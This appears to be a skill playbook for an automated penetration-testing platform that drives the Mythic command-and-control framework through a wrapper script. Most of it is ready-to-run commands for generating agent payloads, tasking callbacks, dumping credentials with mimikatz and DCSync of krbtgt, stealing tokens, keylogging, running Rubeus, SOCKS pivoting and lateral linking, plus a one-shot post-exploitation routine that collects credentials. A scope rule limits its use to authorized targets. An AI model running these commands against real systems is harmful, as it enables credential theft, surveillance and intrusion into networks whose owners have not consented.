# Mythic C2 Framework Integration

## Overview
Mythic is a cross-platform, multiplayer Command & Control framework built with
GoLang, Docker, and a React web UI.  It provides a GraphQL API for full
automation: payload generation, callback management, tasking, file operations,
credential harvesting, SOCKS proxying, P2P linking, screenshots, keylogging,
token manipulation, .NET assembly execution, and BOF loading.

Mythic's plug-n-play architecture separates agents (Payload Types) and
communication channels (C2 Profiles) into independent Docker containers,
making it easy to add/remove capabilities at runtime.

## Scope Rules
1. Only deploy payloads to explicitly authorized targets.
2. Use HTTPS C2 profiles for external engagements; HTTP is acceptable for labs.
3. Clean up all callbacks, payloads, and SOCKS proxies after the engagement.
4. Never upload generated payloads to VirusTotal (burns agent signatures).
5. Credential material must be stored encrypted at rest in the evidence directory.

## Architecture

### Core Components (Docker Containers)
- **mythic_server** — GoLang server handling GraphQL API, WebSocket events, RabbitMQ messaging
- **mythic_postgres** — PostgreSQL database (operations, callbacks, tasks, credentials)
- **mythic_rabbitmq** — RabbitMQ message broker connecting server ↔ agent containers
- **mythic_react** — React web UI for operators
- **mythic_nginx** — Reverse proxy (single HTTPS entry point, default port 7443)
- **mythic_graphql** — Hasura GraphQL console (explore/modify DB)
- **mythic_jupyter** — Jupyter Notebook with `mythic` scripting pre-installed
- **mythic_documentation** — Hugo-based per-agent and per-profile docs

### Agents (Payload Types)
| Agent | Language | Target OS | Key Capabilities |
|-------|----------|-----------|------------------|
| **Apollo** | C# (.NET 4.0) | Windows | Assembly injection, mimikatz, DCSync, BOF, keylog, screenshot, SOCKS5, P2P (SMB/TCP), token manipulation |
| **Poseidon** | Go | Linux/macOS | Shell, file ops, SSH, pty, SOCKS5, P2P, port scanning, keylog (macOS), clipboard |
| **Medusa** | Python 2.7/3.8 | Cross-platform | Eval, module loading, SOCKS5, screenshot (macOS), TCC parsing, shell, file browser |

### C2 Profiles
| Profile | Transport | Use Case |
|---------|-----------|----------|
| **HTTP** | HTTP/HTTPS | Default, highly configurable, proxy-aware |
| **SMB** | Named Pipes | P2P internal lateral movement, no egress needed |
| **TCP** | Raw TCP | P2P or direct connect, low overhead |

## Methodology

### 1. Mythic Server Setup (Sidecar Container)
Mythic runs as a **sidecar service** alongside the Kali executor — NOT inside
the Kali container.  It requires Docker-in-Docker and significant resources
(2+ CPU, 4GB+ RAM, PostgreSQL, RabbitMQ).

```bash
# Check Mythic server status
python3 /opt/tazosploit/scripts/mythic_c2.py --action status --json

# If Mythic is not running, the orchestrator starts it via docker-compose.
# The Kali container connects to Mythic via MYTHIC_URL and MYTHIC_API_KEY env vars.
```

### 2. Agent Selection & Payload Generation
Choose the agent based on target OS/architecture:

```bash
# Windows target → Apollo (.NET)
python3 /opt/tazosploit/scripts/mythic_c2.py \
  --action create-payload --agent apollo --os windows --arch x64 \
  --c2-profile http --json

# Linux/macOS target → Poseidon (Go)
python3 /opt/tazosploit/scripts/mythic_c2.py \
  --action create-payload --agent poseidon --os linux --arch amd64 \
  --c2-profile http --json

# Cross-platform / Python available → Medusa
python3 /opt/tazosploit/scripts/mythic_c2.py \
  --action create-payload --agent medusa --os python \
  --c2-profile http --json
```

### 3. Payload Delivery
Deliver using the same methods as Sliver (see c2_deployment skill):
- RCE: PowerShell/curl download & execute
- File upload: via web vulnerability
- SSH/SCP: direct file transfer
- SMB: smbclient upload + execution

### 4. Callback Management
```bash
# List active callbacks
python3 /opt/tazosploit/scripts/mythic_c2.py --action list-callbacks --json

# Get detailed callback info
python3 /opt/tazosploit/scripts/mythic_c2.py \
  --action callback-info --callback-id {id} --json
```

### 5. Task Execution
```bash
# Execute shell command
python3 /opt/tazosploit/scripts/mythic_c2.py \
  --action task --callback-id {id} --command shell --params "whoami /all" --json

# Get task output (poll for completion)
python3 /opt/tazosploit/scripts/mythic_c2.py \
  --action task-output --task-id {task_id} --json
```

### 6. Post-Exploitation Actions

#### File Browser
```bash
python3 /opt/tazosploit/scripts/mythic_c2.py \
  --action file-browser --callback-id {id} --path "C:\Users" --json
```

#### Process Listing
```bash
python3 /opt/tazosploit/scripts/mythic_c2.py \
  --action task --callback-id {id} --command ps --json
```

#### Credential Harvesting
```bash
# Mimikatz (Apollo on Windows, requires SYSTEM)
python3 /opt/tazosploit/scripts/mythic_c2.py \
  --action task --callback-id {id} \
  --command mimikatz --params "sekurlsa::logonpasswords" --json

# DCSync
python3 /opt/tazosploit/scripts/mythic_c2.py \
  --action task --callback-id {id} \
  --command dcsync --params "-Domain contoso.local -User krbtgt" --json
```

#### Screenshot
```bash
python3 /opt/tazosploit/scripts/mythic_c2.py \
  --action screenshot --callback-id {id} --json
```

#### Keylogging
```bash
# Apollo: inject keylogger into a process
python3 /opt/tazosploit/scripts/mythic_c2.py \
  --action keylog --callback-id {id} --target-pid {pid} --json
```

#### Token Manipulation (Apollo)
```bash
# Steal token from another process
python3 /opt/tazosploit/scripts/mythic_c2.py \
  --action task --callback-id {id} \
  --command steal_token --params "{target_pid}" --json

# Create token with credentials
python3 /opt/tazosploit/scripts/mythic_c2.py \
  --action task --callback-id {id} \
  --command make_token --params '{"domain":"CORP","user":"admin","password":"P@ss"}' --json

# Revert to original token
python3 /opt/tazosploit/scripts/mythic_c2.py \
  --action task --callback-id {id} --command rev2self --json
```

#### .NET Assembly Execution (Apollo)
```bash
python3 /opt/tazosploit/scripts/mythic_c2.py \
  --action execute-assembly --callback-id {id} \
  --assembly Rubeus.exe --assembly-args "triage" --json
```

#### BOF / COFF Execution (Apollo)
```bash
python3 /opt/tazosploit/scripts/mythic_c2.py \
  --action execute-bof --callback-id {id} \
  --bof-file whoami.x64.o --bof-function go --json
```

#### SOCKS Proxy
```bash
python3 /opt/tazosploit/scripts/mythic_c2.py \
  --action start-socks --callback-id {id} --port 1080 --json

# Use with proxychains
proxychains4 nmap -sT -Pn -p 445 10.0.0.0/24
```

#### P2P Agent Linking
```bash
# Link to an internal agent via SMB
python3 /opt/tazosploit/scripts/mythic_c2.py \
  --action link --callback-id {id} \
  --link-host 10.0.0.5 --link-c2 smb --json

# Unlink
python3 /opt/tazosploit/scripts/mythic_c2.py \
  --action task --callback-id {id} --command unlink --json
```

### 7. Full Post-Exploitation Suite
```bash
python3 /opt/tazosploit/scripts/mythic_c2.py \
  --action post-exploit-all --callback-id {id} \
  --output-dir /pentest/output/$JOB_ID --json
```
Runs: enum → processes → credentials → screenshot → file browser → privesc check.

## Deep Dives
Load references when needed:
1. Architecture details: `references/architecture.md`
2. Agent command reference: `references/agent_commands.md`
3. Sidecar deployment design: `references/sidecar_design.md`

## Agent Selection Decision Matrix

| Target OS | Python Available | Domain-Joined | Recommended Agent |
|-----------|-----------------|---------------|-------------------|
| Windows | N/A | Yes | Apollo (assembly + mimikatz + DCSync) |
| Windows | N/A | No | Apollo |
| Linux | Yes | N/A | Medusa (lightweight, no compilation) |
| Linux | No | N/A | Poseidon (static Go binary) |
| macOS | Yes (2.7) | N/A | Medusa (clipboard, screenshot via ObjC) |
| macOS | No | N/A | Poseidon |
| Any (stealth) | Yes | N/A | Medusa (pure Python, no binary drop) |

## Evidence Collection
1. `c2_session.json` — Callback details (ID, host, user, OS, PID, agent type)
2. `credentials.json` — Harvested credentials (hashes, plaintext, tickets)
3. `evidence.json` — Task outputs, screenshots, file contents
4. `findings.json` — Structured vulnerability and access findings
5. `post_exploit_summary.json` — Summary of all post-exploit actions
6. Screenshot PNGs saved to output directory
7. Downloaded files saved as `loot_*` in output directory

## Evidence Consolidation
Use `mythic_c2.py --action post-exploit-all` to automatically:
- Run enumeration and save `enum_results.json`
- Extract credentials and save `credentials.json`
- Capture screenshots and save PNGs
- Build `post_exploit_summary.json`

## Success Criteria
- Mythic server is reachable and API key is valid
- Payload generated for correct OS/arch with appropriate C2 profile
- Callback received and responds to tasking
- Post-exploitation tasks return valid results
- Credentials or sensitive data extracted (where applicable)
- All evidence artifacts saved to the output directory

## Tool References
- ../toolcards/mythic.md (if available)
- https://docs.mythic-c2.net
- https://github.com/its-a-feature/Mythic
- https://github.com/MythicAgents/Apollo
- https://github.com/MythicAgents/Poseidon
- https://github.com/MythicAgents/Medusa
